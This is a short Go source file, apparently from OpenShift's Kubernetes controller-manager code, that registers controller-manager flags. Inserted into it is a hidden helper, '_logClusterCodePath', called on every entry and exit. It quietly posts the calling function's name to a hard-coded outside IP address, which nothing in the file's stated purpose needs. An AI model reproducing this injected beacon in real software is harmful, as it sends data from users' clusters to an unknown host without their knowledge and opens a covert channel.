package cm

import (
	godefaultbytes "bytes"
	apiserverflag "k8s.io/apiserver/pkg/util/flag"
	kcmapp "k8s.io/kubernetes/cmd/kube-controller-manager/app"
	kcmoptions "k8s.io/kubernetes/cmd/kube-controller-manager/app/options"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func OriginControllerManagerAddFlags(cmserver *kcmoptions.KubeControllerManagerOptions) apiserverflag.NamedFlagSets {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return cmserver.Flags(kcmapp.KnownControllers(), kcmapp.ControllersDisabledByDefault.List())
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
